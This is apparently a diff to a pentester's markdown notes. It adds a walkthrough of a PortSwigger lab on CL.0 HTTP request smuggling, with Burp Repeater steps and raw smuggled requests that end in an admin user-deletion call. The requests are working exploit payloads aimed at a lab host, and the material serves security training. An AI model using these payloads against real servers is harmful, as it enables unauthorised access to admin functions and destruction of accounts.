@@ -435,6 +435,72 @@ Will bypass sso by opening up a popup window for our victim to change email
 </script>
 ```
 
+**CL.0 request smuggling** 
+
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a7bfaaa2-c936-43ac-bebe-40f0f4f8b7c0)
+
+
+
+Add these two to a group on repeater
+
+
+
+
+
+Add the following to group 1.2
+
+```
+POST / HTTP/2
+Host: 0a0c008e037599ba807612a4006d00b1.web-security-academy.net
+Cookie: session=34g6IyUAUQpkwNdGkko1Z8A93ZKOVzcg
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+GET /hopefully404 HTTP/1.1
+Foo: x
+```
+
+change the send mode to Send group in sequence (single connection). 
+
+From <https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling> 
+
+Send the sequence and check the responses. 
+
+From <https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling> 
+
+Deduce that you can use requests for static files under /resources, such as /resources/images/blog.svg, to cause a CL.0 desync. 
+
+From <https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling> 
+
+```
+POST /resources/images/blog.svg HTTP/2
+Host: 0a0c008e037599ba807612a4006d00b1.web-security-academy.net
+Cookie: session=34g6IyUAUQpkwNdGkko1Z8A93ZKOVzcg
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+GET /hopefully404 HTTP/1.1
+Foo: x
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/efbd6f36-8e92-41d5-ac5a-3c134ad3158d)
+
+
+
+Delete user with 
+```
+POST /resources/images/blog.svg HTTP/2
+Host: 0a0c008e037599ba807612a4006d00b1.web-security-academy.net
+Cookie: session=34g6IyUAUQpkwNdGkko1Z8A93ZKOVzcg
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+
+GET /admin/delete?username=carlos HTTP/1.1
+Foo: x
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/51697451-e141-43f1-ac6d-57bcc103675c)
+
+
+
 
 
 
